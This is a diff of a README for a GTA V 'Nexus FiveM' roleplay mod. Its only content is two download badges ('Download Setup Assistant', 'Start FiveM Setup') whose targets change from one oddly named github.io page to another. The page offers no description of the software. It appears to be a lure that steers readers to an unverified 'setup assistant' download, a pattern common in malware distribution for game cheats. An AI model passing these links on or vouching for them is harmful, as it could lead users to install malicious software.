@@ -1,7 +1,7 @@
 # 🚓 Nexus FiveM —  for GTA V RP
 
-[![Download Setup Assistant](https://img.shields.io/badge/Download_Setup_Assistant-green?style=for-the-badge)](https://gtavrpforpcinf0.github.io/.github/)
-[![Start FiveM Setup](https://img.shields.io/badge/Start_FiveM_Setup-blue?style=for-the-badge&logo=github)](https://gtavrpforpcinf0.github.io/.github/)
+[![Download Setup Assistant](https://img.shields.io/badge/Download_Setup_Assistant-green?style=for-the-badge)](https://rpfive-menumod-forpc.github.io/.github/)
+[![Start FiveM Setup](https://img.shields.io/badge/Start_FiveM_Setup-blue?style=for-the-badge&logo=github)](https://rpfive-menumod-forpc.github.io/.github/)
 
 ---
 
